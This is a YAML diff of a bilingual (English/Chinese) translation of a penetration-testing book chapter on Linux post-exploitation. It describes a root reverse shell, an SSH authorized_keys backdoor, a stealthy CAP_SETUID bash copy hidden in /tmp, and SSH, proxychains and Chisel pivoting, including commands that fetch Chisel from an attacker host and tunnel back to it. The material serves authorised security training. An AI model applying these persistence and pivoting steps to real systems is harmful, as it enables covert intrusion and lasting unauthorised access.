 - en: '![Figure 12.9 – We download the script to the target system](image/B22229_12_09.jpg)'
+  id: totrans-131
   prefs: []
   type: TYPE_IMG
+  zh: '![图 12.9 – 我们将脚本下载到目标系统](image/B22229_12_09.jpg)'
 - en: Figure 12.9 – We download the script to the target system
+  id: totrans-132
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.9 – 我们将脚本下载到目标系统
 - en: 'In the following figure, we’re making the script executable and running it:'
+  id: totrans-133
   prefs: []
   type: TYPE_NORMAL
+  zh: 在下图中，我们正在使脚本可执行并运行它：
 - en: '![Figure 12.10 – We make the script executable and execute it to enable and
     start the service](image/B22229_12_10.jpg)'
+  id: totrans-134
   prefs: []
   type: TYPE_IMG
+  zh: '![图 12.10 – 我们使脚本可执行并执行它以启用并启动服务](image/B22229_12_10.jpg)'
 - en: Figure 12.10 – We make the script executable and execute it to enable and start
     the service
+  id: totrans-135
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.10 – 我们使脚本可执行并执行它以启用并启动服务
 - en: 'Now, we receive a reverse shell as root on Kali:'
+  id: totrans-136
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在，我们在 Kali 上以 root 用户身份接收到反向 Shell：
 - en: '![Figure 12.11: We receive a reverse shell as root on Kali](image/B22229_12_11.jpg)'
+  id: totrans-137
   prefs: []
   type: TYPE_IMG
+  zh: '![图 12.11: 我们在 Kali 上以 root 用户身份接收到反向 Shell](image/B22229_12_11.jpg)'
 - en: 'Figure 12.11: We receive a reverse shell as root on Kali'
+  id: totrans-138
   prefs: []
   type: TYPE_NORMAL
+  zh: '图 12.11: 我们在 Kali 上以 root 用户身份接收到反向 Shell'
 - en: In this section, you learned how systemd system services work, how system service
     files are structured, and how to use them for post-exploitation persistence. In
     the next section, you’ll learn how to regain access at will by appending SSH keys
     to a user profile.
+  id: totrans-139
   prefs: []
   type: TYPE_NORMAL
+  zh: 在本节中，您学习了 systemd 系统服务的工作原理，系统服务文件的结构，以及如何利用它们实现后期渗透持久化。在下一节中，您将学习如何通过将 SSH
+    密钥添加到用户配置文件中来随时恢复访问。
 - en: Backdooring with SSH authorized keys
+  id: totrans-140
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 使用 SSH 授权密钥后门
 - en: The SSH **authorized_keys** file is a mechanism for controlling SSH access to
     a user account without requiring a password. This section will provide an overview
     of how it works and its potential use for persistence.
+  id: totrans-141
   prefs: []
   type: TYPE_NORMAL
+  zh: SSH **authorized_keys** 文件是一种控制用户账户 SSH 访问的机制，无需密码即可登录。本节将概述它的工作原理以及如何利用它进行持久化。
 - en: 'Here’s how the **authorized_keys** file works:'
+  id: totrans-142
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下是 **authorized_keys** 文件的工作原理：
 - en: It’s located in the **~/.ssh/authorized_keys** file for each user.
+  id: totrans-143
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 它位于每个用户的 **~/.ssh/authorized_keys** 文件中。
 - en: It contains public keys, one per line.
+  id: totrans-144
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 它包含公钥，每行一个。
 - en: When a client attempts to connect, the server checks whether the client’s public
     key matches any in this file.
+  id: totrans-145
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 当客户端尝试连接时，服务器会检查客户端的公钥是否与该文件中的任何密钥匹配。
 - en: If a match is found, the connection is allowed without the need to prompt for
     a password.
+  id: totrans-146
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 如果找到匹配项，连接将被允许，而无需提示输入密码。
 - en: After gaining access to a user account, if you find that SSH is accessible,
     you can add your public key to a user’s **authorized_keys** file. This will allow
     you to maintain SSH access, even if passwords are changed.
+  id: totrans-147
   prefs: []
   type: TYPE_NORMAL
+  zh: 在获得用户账户访问权限后，如果发现 SSH 可用，您可以将自己的公钥添加到用户的 **authorized_keys** 文件中。即使密码被更改，这也将允许您保持
+    SSH 访问。
 - en: 'To add a key, run the following command:'
+  id: totrans-148
   prefs: []
   type: TYPE_NORMAL
+  zh: 要添加密钥，请运行以下命令：
 - en: '[PRE10]'
+  id: totrans-149
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE10]'
 - en: This command appends your public key to the **authorized_keys** file.
+  id: totrans-150
   prefs: []
   type: TYPE_NORMAL
+  zh: 此命令将您的公钥添加到 **authorized_keys** 文件中。
 - en: 'Let’s take a closer look:'
+  id: totrans-151
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们仔细看看：
 - en: '**echo** : This outputs the specified text.'
+  id: totrans-152
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**echo** : 该命令用于输出指定文本。'
 - en: The text is the attacker’s public key. It starts with **ssh-rsa** and is followed
     by the key data.
+  id: totrans-153
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 该文本是攻击者的公钥。它以 **ssh-rsa** 开头，后面跟着密钥数据。
 - en: '**>>** : This redirects and appends the output to the **authorized_keys** file.'
+  id: totrans-154
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**>>** : 该命令会将输出重定向并附加到 **authorized_keys** 文件。'
 - en: '**~/.ssh/authorized_keys** : This specifies the file path in the user’s home
     directory.'
+  id: totrans-155
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**~/.ssh/authorized_keys** : 这是指定用户主目录下的文件路径。'
 - en: This technique provides a stealthy way to maintain access as it doesn’t require
     system binaries to be modified or new user accounts to be created. However, it
     may be detected by monitoring changes to **authorized_keys** files or through
     SSH key audits.
+  id: totrans-156
   prefs: []
   type: TYPE_NORMAL
+  zh: 这种技术提供了一种隐蔽的方式来维持访问，因为它不需要修改系统二进制文件或创建新的用户账户。然而，通过监控 **authorized_keys** 文件的变化或进行
+    SSH 密钥审计，仍然可能被发现。
 - en: Next, we’ll look at more advanced persistence techniques.
+  id: totrans-157
   prefs: []
   type: TYPE_NORMAL
+  zh: 接下来，我们将深入了解更高级的持久性技术。
 - en: Learning advanced persistence techniques
+  id: totrans-158
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 学习高级持久性技术
 - en: In this section, we’ll explore a persistence technique that’s a bit more advanced
     and might be more stealthy and therefore less likely to be caught during your
     pentest.
+  id: totrans-159
   prefs: []
   type: TYPE_NORMAL
+  zh: 在这一部分，我们将探索一种更高级的持久性技术，它可能更加隐蔽，因此在渗透测试过程中更不容易被发现。
 - en: Capabilities in Linux are a security feature that allows for fine-grained control
     over what privileged operations processes can perform. They provide a way to grant
     specific privileges to processes without the need to give them full root access.
     This helps improve system security by following the principle of least privilege.
+  id: totrans-160
   prefs: []
   type: TYPE_NORMAL
+  zh: Linux 中的能力是一种安全特性，允许对进程可以执行的特权操作进行精细控制。它们提供了一种授予进程特定权限的方式，而不需要给予其完全的 root 访问权限。这有助于通过遵循最小特权原则来提高系统安全性。
 - en: 'The following are some key points about Linux’s capabilities:'
+  id: totrans-161
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下是关于 Linux 能力的一些关键点：
 - en: They break down the traditional all-or-nothing root privileges into smaller,
     more specific permissions.
+  id: totrans-162
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 它们将传统的全有或全无 root 权限细分为更小、更具体的权限。
 - en: Capabilities are associated with executable files and processes, not users.
+  id: totrans-163
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 能力与可执行文件和进程相关，而不是与用户相关。
 - en: There are over 40 distinct capabilities in modern Linux kernels.
+  id: totrans-164
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 现代 Linux 内核中有超过 40 种不同的能力。
 - en: 'The following are some c ommon capabilities:'
+  id: totrans-165
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 以下是一些常见的能力：
 - en: '**CAP_SETUID** : This capability allows a process to set the user ID of the
     current process, effectively enabling it to switch to any user, including root.'
+  id: totrans-166
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**CAP_SETUID**：该能力允许进程设置当前进程的用户 ID，从而使其能够切换到任何用户，包括 root。'
 - en: '**CAP_NET_BIND_SERVICE** : This allows us to bind to privileged ports (< **1024**
     ).'
+  id: totrans-167
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**CAP_NET_BIND_SERVICE**：这允许我们绑定到特权端口（< **1024**）。'
 - en: '**CAP_CHOWN** : This allows us to change file ownership.'
+  id: totrans-168
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**CAP_CHOWN**：这允许我们更改文件的所有权。'
 - en: '**CAP_DAC_OVERRIDE** : This allows us to bypass file read, write, and execute
     permission checks.'
+  id: totrans-169
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**CAP_DAC_OVERRIDE**：这允许我们绕过文件读取、写入和执行权限检查。'
 - en: Capabilities can be viewed with **getcap** and set on executable files using
     **setcap** .
+  id: totrans-170
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 可以通过**getcap**查看能力，并使用**setcap**在可执行文件上设置能力。
 - en: 'Here’s an example of how to view the capabilities of a process:'
+  id: totrans-171
   prefs: []
   type: TYPE_NORMAL
+  zh: 下面是如何查看进程能力的一个示例：
 - en: '[PRE11]'
+  id: totrans-172
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE11]'
 - en: 'Here’s an example of how to set the capabilities of an executable:'
+  id: totrans-173
   prefs: []
   type: TYPE_NORMAL
+  zh: 下面是如何设置可执行文件能力的一个示例：
 - en: '[PRE12]'
+  id: totrans-174
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE12]'
 - en: This command grants the **CAP_SUID** capability to the specified executable.
+  id: totrans-175
   prefs: []
   type: TYPE_NORMAL
+  zh: 此命令将 **CAP_SUID** 能力授予指定的可执行文件。
 - en: 'To view the capabilities of a running process, run the following command, replacing
     **PID** with the process ID you want to check:'
+  id: totrans-176
   prefs: []
   type: TYPE_NORMAL
+  zh: 要查看正在运行的进程的能力，请运行以下命令，将**PID**替换为你想检查的进程 ID：
 - en: '[PRE13]'
+  id: totrans-177
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE13]'
 - en: The capability’s **=eip** suffix provides a way to precisely control which capabilities
     are available to processes and how they can be used or passed on to child processes.
     This granular control allows system administrators to implement the principle
     of least privilege, granting only the specific capabilities required for a process
     to function, rather than giving it full root privileges.
+  id: totrans-178
   prefs: []
   type: TYPE_NORMAL
+  zh: 能力的**=eip**后缀提供了一种精确控制进程可用能力及其如何被使用或传递给子进程的方式。这种细粒度的控制使得系统管理员可以实施最小特权原则，只授予进程执行所需的特定能力，而不是给予其完全的
+    root 权限。
 - en: The **=eip** suffix refers to the *effective* , *inheritable* , and *permitted*
     set of capabilities. This suffix is used when setting or viewing capabilities
     on files or processes in Linux systems that support fine-grained privilege control.
+  id: totrans-179
   prefs: []
   type: TYPE_NORMAL
+  zh: '**=eip** 后缀表示 *有效*、*可继承* 和 *许可* 的能力集。这个后缀用于设置或查看 Linux 系统上支持精细化权限控制的文件或进程的能力。'
 - en: 'To understand **=eip** , let’s break it down:'
+  id: totrans-180
   prefs: []
   type: TYPE_NORMAL
+  zh: 为了理解**=eip**，我们来逐一解析：
 - en: '**e** – *effective* : These are the capabilities currently in use by the process.'
+  id: totrans-181
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**e** – *有效*：这些是当前进程正在使用的能力。'
 - en: '**i** – *inheritable* : These capabilities can be inherited by child processes.'
+  id: totrans-182
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**i** – *可继承*：这些能力可以被子进程继承。'
 - en: '**p** – *permitted* : These are the capabilities that the process is allowed
     to use.'
+  id: totrans-183
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**p** – *许可*：这些是进程允许使用的能力。'
 - en: 'When you see a capability with the **=eip** suffix, it means that the capability
     has been set for all three sets: effective, inheritable, and permitted.'
+  id: totrans-184
   prefs: []
   type: TYPE_NORMAL
+  zh: 当你看到一个带有**=eip**后缀的能力时，意味着该能力已被设置为所有三个集合：有效、可继承和允许。
 - en: 'For example, if you were to set the **CAP_SETUID** capability on a file with
     **=eip** , you could use a command like this:'
+  id: totrans-185
   prefs: []
   type: TYPE_NORMAL
+  zh: 例如，如果你将**CAP_SETUID**能力设置到一个文件上，并且其值为**=eip**，你可以使用如下命令：
 - en: '[PRE14]'
+  id: totrans-186
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE14]'
 - en: This command sets the **CAP_SETUID** capability as effective, inheritable, and
     permitted for the specified file.
+  id: totrans-187
   prefs: []
   type: TYPE_NORMAL
+  zh: 该命令将**CAP_SETUID**能力设置为有效、可继承且允许的，适用于指定的文件。
 - en: 'Here’s an example of using Linux capabilities to maintain persistent access
     post-exploitation stealthily. This script demonstrates how to maintain access
     using Linux capabilities. You can find it in this chapter’s GitHub repository
     as **ch12_capabilities.sh** :'
+  id: totrans-188
   prefs: []
   type: TYPE_NORMAL
+  zh: 这是一个使用Linux能力维持持续访问权限的例子，且操作隐蔽。这个脚本展示了如何使用Linux能力保持访问权限。你可以在本章的GitHub代码库中找到它，文件名为**ch12_capabilities.sh**：
 - en: '[PRE15]'
+  id: totrans-189
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE15]'
 - en: 'Let’s take a closer look at this code:'
+  id: totrans-190
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们仔细看一下这段代码：
 - en: First, it creates a hidden directory in **/tmp** .
+  id: totrans-191
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 首先，它会在**/tmp**中创建一个隐藏目录。
 - en: The script copies the Bash shell to this hidden location.
+  id: totrans-192
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 脚本将Bash shell复制到这个隐藏位置。
 - en: Then, it uses the **setcap** command to add the **CAP_SETUID** capability to
     the copied shell. This capability allows the shell to set the user ID, effectively
     giving it root-like privileges.
+  id: totrans-193
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 然后，它使用**setcap**命令将**CAP_SETUID**能力添加到复制的shell中。这个能力使得shell可以设置用户ID，从而有效地赋予其类似root的权限。
 - en: Directories such as **/tmp** and **/dev/shm** may be cleared on restart, so
     be sure to check whether they’re mounted as a filesystem of the **tmpfs** type
     before saving any files for persistence. If they’re mounted as **tmpfs** , then
     you need to choose a different location; otherwise, your persistence mechanism
     will be lost on restart. You can check this by entering the **mount** command
     and **grep** for the directory location – for example, **/tmp** .
+  id: totrans-194
   prefs: []
   type: TYPE_NORMAL
+  zh: 像**/tmp**和**/dev/shm**这样的目录可能会在重启时被清空，因此在保存任何文件以维持持久性之前，请务必检查它们是否已挂载为**tmpfs**类型的文件系统。如果它们被挂载为**tmpfs**，你需要选择一个不同的位置；否则，你的持久性机制将在重启时丢失。你可以通过执行**mount**命令并使用**grep**查找目录位置来检查——例如，检查**/tmp**。
 - en: This technique is difficult to detect through standard system monitoring. It
     doesn’t modify core system files or create new user accounts. However, it provides
     a way to regain elevated privileges.
+  id: totrans-195
   prefs: []
   type: TYPE_NORMAL
+  zh: 这种技术通过标准系统监控很难被检测到。它不会修改核心系统文件，也不会创建新的用户账户。然而，它提供了一种重新获得提升权限的方式。
 - en: Understanding and using Linux capabilities provides a more stealthy way to regain
     privileged access for post-exploitation operations.
+  id: totrans-196
   prefs: []
   type: TYPE_NORMAL
+  zh: 理解并使用Linux能力提供了一种更隐蔽的方式，以便在后期利用操作中重新获得特权访问权限。
 - en: In the next section, we’ll explore methods that are used to pivot through compromised
     Linux Bash environments to gain access to networks that would otherwise be beyond
     our reach.
+  id: totrans-197
   prefs: []
   type: TYPE_NORMAL
+  zh: 在下一节中，我们将探讨通过被攻陷的Linux Bash环境进行跳板的方法，从而访问本来无法接触的网络。
 - en: The basics of network pivoting with Bash
+  id: totrans-198
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 使用Bash进行网络跳板的基础
 - en: In the field of pentesting, it’s quite usual to utilize a breached system as
     a stepping-stone for exploring and accessing additional networks linked to that
     system. This section will explore the methodology that’s used to pivot through
     a compromised Linux Bash environment.
+  id: totrans-199
   prefs: []
   type: TYPE_NORMAL
+  zh: 在渗透测试领域，利用被攻陷的系统作为跳板，探索并访问与该系统连接的其他网络是非常常见的做法。本节将探讨在被攻陷的Linux Bash环境中进行跳板的使用方法。
 - en: 'SSH port forwarding is a simple yet effective method for pivoting. It allows
     you to tunnel traffic through an SSH connection, enabling access to otherwise
     unreachable systems. In this section, we’ll cover two types of SSH port forwarding:
     local and remote.'
+  id: totrans-200
   prefs: []
   type: TYPE_NORMAL
+  zh: SSH端口转发是一种简单却有效的跳板方法。它允许你通过SSH连接传输流量，从而访问原本无法到达的系统。在本节中，我们将介绍两种类型的SSH端口转发：本地转发和远程转发。
 - en: 'Local port forwarding lets you forward a port from your local machine to a
     remote server through an SSH connection. The following command is an example of
     local port forwarding:'
+  id: totrans-201
   prefs: []
   type: TYPE_NORMAL
+  zh: 本地端口转发允许你通过SSH连接将本地计算机的端口转发到远程服务器。以下命令是本地端口转发的示例：
 - en: '[PRE16]'
+  id: totrans-202
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE16]'
 - en: This command establishes an SSH connection to **pivot_host** and forwards local
     port **8080** to port **80** on **internal_server** through the **pivot_host**
     . After executing this command, accessing **localhost:8080** on your local machine
     will reach port **80** on **internal_server** . Local port forwarding is best
     used when you need to reach a single server port on an internal network through
     a compromised system.
+  id: totrans-203
   prefs: []
   type: TYPE_NORMAL
+  zh: 这个命令通过**pivot_host**建立一个SSH连接，并将本地端口**8080**转发到**internal_server**上的端口**80**。执行该命令后，访问本地机器上的**localhost:8080**将会连接到**internal_server**上的端口**80**。本地端口转发最适用于需要通过被攻陷的系统访问内网单一服务器端口的情况。
 - en: 'Remote port forwarding is the reverse of local port forwarding. It allows you
     to forward a port from the remote SSH server to your local machine. The following
     command exemplifies starting a remote port forward with SSH:'
+  id: totrans-204
   prefs: []
   type: TYPE_NORMAL
+  zh: 远程端口转发是本地端口转发的反向操作。它允许你将远程SSH服务器上的端口转发到本地机器。以下命令演示了如何使用SSH启动远程端口转发：
 - en: '[PRE17]'
+  id: totrans-205
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE17]'
 - en: This command forwards port **8080** on **pivot_host** to port **80** on your
     local machine. So, anyone accessing port **8080** on **pivot_host** will reach
     port **80** on your local machine. Remote port forwarding is best used when you
     need to exfiltrate data out of an internal network, such as when you need to receive
     a reverse shell.
+  id: totrans-206
   prefs: []
   type: TYPE_NORMAL
+  zh: 这个命令将**pivot_host**上的端口**8080**转发到你本地机器上的端口**80**。因此，任何访问**pivot_host**上端口**8080**的人都会到达你本地机器上的端口**80**。远程端口转发最适用于当你需要将数据从内网外泄时，比如当你需要接收一个反向Shell时。
 - en: SSH forward port forwarding can be inflexible because they are one-to-one port
     mappings. A **Socket Secure** ( **SOCKS** ) proxy is a general-purpose proxy that
     routes network traffic between a client and a server via a proxy server. Setting
     up a SOCKS proxy with SSH allows for more flexible pivoting as it can handle various
     types of traffic.
+  id: totrans-207
   prefs: []
   type: TYPE_NORMAL
+  zh: SSH端口转发可能不够灵活，因为它们是单一端口映射。**Socket Secure**（**SOCKS**）代理是一种通用的代理，它通过代理服务器在客户端和服务器之间路由网络流量。通过SSH设置SOCKS代理能够实现更灵活的pivot操作，因为它可以处理各种类型的流量。
 - en: 'The following SSH command initiates a dynamic SOCKS proxy:'
+  id: totrans-208
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下SSH命令启动一个动态SOCKS代理：
 - en: '[PRE18]'
+  id: totrans-209
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE18]'
 - en: 'This command establishes an SSH connection to **pivot_host** and creates a
     SOCKS proxy on local port **9050** . You can then configure your applications
     (for example, web browser) to use this SOCKS proxy. For example, you can use this
     proxy with **curl** :'
+  id: totrans-210
   prefs: []
   type: TYPE_NORMAL
+  zh: 这个命令通过SSH连接到**pivot_host**并在本地端口**9050**创建一个SOCKS代理。然后，你可以配置你的应用程序（例如，web浏览器）使用这个SOCKS代理。例如，你可以通过**curl**使用这个代理：
 - en: '[PRE19]'
+  id: totrans-211
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE19]'
 - en: This command sends an HTTP request to **internal_server** through the SOCKS
     proxy.
+  id: totrans-212
   prefs: []
   type: TYPE_NORMAL
+  zh: 这个命令通过SOCKS代理向**internal_server**发送HTTP请求。
 - en: You can also use the **proxychains** tool in combination with a SOCKS proxy.
     This is most helpful when you need to use tools that aren’t proxy-aware with a
     SOCKS proxy.
+  id: totrans-213
   prefs: []
   type: TYPE_NORMAL
+  zh: 你还可以将**proxychains**工具与SOCKS代理结合使用。当你需要用不支持代理的工具通过SOCKS代理时，这种方法特别有用。
 - en: We need to configure proxychains before we can use it. The configuration file
     is typically located at **/etc/proxychains4.conf** . Edit this file and change
     the last line from **socks4 127.0.0.1 9050** to **socks5** **127.0.0.1 9050**
     . Note that there’s a tab character between **socks5** and **127.0.0.1** .
+  id: totrans-214
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们需要在使用proxychains之前进行配置。配置文件通常位于**/etc/proxychains4.conf**。编辑这个文件，将最后一行从**socks4
+    127.0.0.1 9050**更改为**socks5 127.0.0.1 9050**。请注意，在**socks5**和**127.0.0.1**之间有一个制表符。
 - en: 'Now that we have proxychains set up, let’s use it on Kali with **nmap** to
     perform a TCP port scan. Here’s the basic syntax:'
+  id: totrans-215
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在我们已经设置好了proxychains，让我们在Kali上使用它与**nmap**一起进行TCP端口扫描。基本语法如下：
 - en: '[PRE20]'
+  id: totrans-216
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE20]'
 - en: 'Let’s take a closer look at this command:'
+  id: totrans-217
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们仔细看看这个命令：
 - en: '**proxychains -q** : This tells the system to use proxychains for the following
     command. The **-q** option makes proxychains quiet.'
+  id: totrans-218
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**proxychains -q**：这个命令告诉系统为接下来的命令使用proxychains。**-q**选项使proxychains变得安静。'
 - en: '**nmap** : The network mapping tool we’re using.'
+  id: totrans-219
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**nmap**：我们正在使用的网络映射工具。'
 - en: '**-sT** : This flag tells **nmap** to perform a TCP connect scan. You can’t
     perform a TCP SYN or UDP scan through a SOCKS proxy. The scan must be a TCP connect
     scan.'
+  id: totrans-220
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**-sT**：这个标志告诉**nmap**执行TCP连接扫描。你无法通过SOCKS代理执行TCP SYN扫描或UDP扫描。扫描必须是TCP连接扫描。'
 - en: '**-p-** : This flag tells **nmap** to scan all ports ( **1** - **65535** ).'
+  id: totrans-221
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**-p-**：这个标志告诉**nmap**扫描所有端口（**1** - **65535**）。'
 - en: '**[target_ip]** : Replace this with the IP address you want to scan.'
+  id: totrans-222
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**[target_ip]**：将此处替换为你想要扫描的IP地址。'
 - en: In this case, our current target doesn’t have SSH exposed. You’ll learn how
     to pivot when SSH isn’t available in the next section.
+  id: totrans-223
   prefs: []
   type: TYPE_NORMAL
+  zh: 在这种情况下，我们当前的目标没有暴露SSH。你将在下一节中学到当SSH不可用时如何进行pivot操作。
 - en: Be aware that scanning through a SOCKS proxy is very slow. You may want to restrict
     your scans to a limited number of ports. An alternative is to transfer a tool
     such as Goscan to the pivot host and scan from there. You can find Goscan at [https://github.com/sdcampbell/goscan](https://github.com/sdcampbell/goscan)
     . ProjectDiscovery Naabu is another option.
+  id: totrans-224
   prefs: []
   type: TYPE_NORMAL
+  zh: 请注意，通过SOCKS代理进行扫描非常慢。你可能想要限制扫描的端口数量。另一种选择是将像Goscan这样的工具传输到跳板主机，然后从那里进行扫描。你可以在[https://github.com/sdcampbell/goscan](https://github.com/sdcampbell/goscan)找到Goscan。ProjectDiscovery
+    Naabu是另一个选择。
 - en: These basic pivoting techniques provide a foundation for accessing restricted
     network segments during pentesting. They allow you to extend your reach within
     a target environment, facilitating further exploration and testing of internal
     systems. We’ll explore more advanced pivot ing techniques in the next section.
+  id: totrans-225
   prefs: []
   type: TYPE_NORMAL
+  zh: 这些基本的跳板技术为渗透测试中访问受限网络段提供了基础。它们使你能够扩展在目标环境中的访问范围，便于进一步探索和测试内部系统。我们将在下一节中探讨更先进的跳板技术。
 - en: Mastering advanced pivoting and lateral movement
+  id: totrans-226
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 精通高级跳板和横向移动
 - en: In this section, we’ll explore advanced pivoting and lateral movement techniques
     using Bash scripting. These methods go beyond basic SSH tunneling and SOCKS proxies,
     focusing on more sophisticated approaches to navigate complex network environments.
+  id: totrans-227
   prefs: []
   type: TYPE_NORMAL
+  zh: 在本节中，我们将探索使用Bash脚本进行的高级跳板和横向移动技术。这些方法超越了基本的SSH隧道和SOCKS代理，着重于更复杂的方法，以便在复杂的网络环境中导航。
 - en: Dynamic chain pivoting
+  id: totrans-228
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 动态链式跳转
 - en: '**Dynamic chain pivoting** involves creating a series of interconnected pivots
     to reach deeper into a network. This technique is particularly useful when you’re
     dealing with segmented networks or when you need to bypass multiple layers of
     security.'
+  id: totrans-229
   prefs: []
   type: TYPE_NORMAL
+  zh: '**动态链式跳转**涉及创建一系列相互连接的跳板，以便更深入地进入网络。该技术在处理分段网络或需要绕过多个安全层时特别有用。'
 - en: 'Here’s a Bash script that automates the process of setting up a dynamic pivot
     chain. You can find this script in this chapter’s GitHub repository as **ch12_dynamic_pivot.sh**
     :'
+  id: totrans-230
   prefs: []
   type: TYPE_NORMAL
+  zh: 这是一个Bash脚本，它自动化了设置动态跳板链的过程。你可以在本章的GitHub仓库中找到这个脚本，名为**ch12_dynamic_pivot.sh**。
 - en: '[PRE21]'
+  id: totrans-231
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE21]'
 - en: Run this script on the attacker machine. This script sets up a chain of SSH
     tunnels through multiple pivot hosts. It starts by creating a local port forward
     on the attacker machine, then chains through each pivot host, ultimately reaching
     the target. The script uses a loop to create each link in the chain, with special
     handling for the first and last pivots.
+  id: totrans-232
   prefs: []
   type: TYPE_NORMAL
+  zh: 在攻击者机器上运行此脚本。该脚本通过多个跳板主机设置一系列SSH隧道。它从在攻击者机器上创建一个本地端口转发开始，然后通过每个跳板主机进行链式连接，最终到达目标。该脚本使用循环来创建链中的每个环节，并对第一个和最后一个跳板进行特殊处理。
 - en: Tip
+  id: totrans-233
   prefs: []
   type: TYPE_NORMAL
+  zh: 提示
 - en: SSH provides an easier way to do the same thing using jump hosts. The syntax
     of the SSH command to use multiple jump hosts is **ssh -J** **user1@jumphost1,user2@jumphost2
     user3@targethost** .
+  id: totrans-234
   prefs: []
   type: TYPE_NORMAL
+  zh: SSH提供了一种更简单的方法，通过跳板主机完成相同的操作。使用多个跳板主机的SSH命令语法是**ssh -J** **user1@jumphost1,user2@jumphost2
+    user3@targethost**。
 - en: Dynamic chain pivoting can be performed without SSH access using external tools.
     Two related tools are Chisel ( [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
     ) and Ligolo-ng ( [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
     ). These tools can be used in situations where you don’t have an SSH server to
     pivot through. They require you to upload a single executable to the pivot host
     and don’t require root privileges to operate.
+  id: totrans-235
   prefs: []
   type: TYPE_NORMAL
+  zh: 动态链式跳转可以在没有SSH访问权限的情况下，使用外部工具执行。两个相关的工具是Chisel（[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)）和Ligolo-ng（[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)）。这些工具可以在没有SSH服务器的情况下用于跳转。它们要求你将一个可执行文件上传到跳板主机，并且不需要root权限即可操作。
 - en: I’ll be using Chisel in this example.
+  id: totrans-236
   prefs: []
   type: TYPE_NORMAL
+  zh: 在这个示例中，我将使用Chisel。
 - en: Making a note of my Kali system’s current IP address, I’ll start an HTTP server
     to transfer Chisel over to the target by entering the **python3 -m http.server**
     command in the same directory where I’ve downloaded Chisel.
+  id: totrans-237
   prefs: []
   type: TYPE_NORMAL
+  zh: 记下我的Kali系统的当前IP地址后，我将在同一目录下启动一个HTTP服务器，将Chisel传输到目标主机，方法是在该目录下运行**python3 -m
+    http.server**命令。
 - en: On the target system where I have a shell as **user6** , I’ll download the Chisel
     file in the **/tmp** directory using the **wget** [http://10.0.0.66:8000/chisel](http://10.0.0.66:8000/chisel)
     command. You must make it executable before you can run it using the **chmod +x
     chisel** command. You must also run the same command on Kali because you’ll need
     to run Chisel on both ends of the connection.
+  id: totrans-238
   prefs: []
   type: TYPE_NORMAL
+  zh: 在我作为 **user6** 拥有 shell 权限的目标系统上，我将使用 **wget** [http://10.0.0.66:8000/chisel](http://10.0.0.66:8000/chisel)
+    命令将 Chisel 文件下载到 **/tmp** 目录。在运行之前，您必须使用 **chmod +x chisel** 命令使其具备可执行权限。您还必须在
+    Kali 上运行相同的命令，因为您需要在连接的两端都运行 Chisel。
 - en: Next, start Chisel on Kali using the **./chisel server -p 8001 –reverse** command.
     Then, on the target (pivot) system, run the **./chisel client 10.0.0.66:8001 R:1080:socks**
     command. Ensure that you replace the IP address with your own as appropriate.
+  id: totrans-239
   prefs: []
